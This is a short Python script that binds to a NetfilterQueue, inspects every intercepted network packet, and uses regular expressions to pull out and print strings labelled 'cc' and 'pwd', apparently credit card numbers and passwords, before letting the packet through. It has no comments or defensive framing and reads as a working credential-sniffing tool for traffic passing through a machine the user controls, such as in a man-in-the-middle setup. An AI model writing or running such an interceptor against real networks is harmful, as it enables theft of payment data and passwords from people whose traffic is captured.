import re
from netfilterqueue import NetfilterQueue

def print_and_accept(pkt):
  payload = str(pkt.get_payload())
  cc = re.search('cc .......................', payload)
  if cc != None:
    print(cc.group(0))
  pwd = re.search('pwd .....................', payload)
  if pwd != None:
    print(pwd.group(0))
  pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
  nfqueue.run()
except KeyboardInterrupt:
  print('')

nfqueue.unbind()
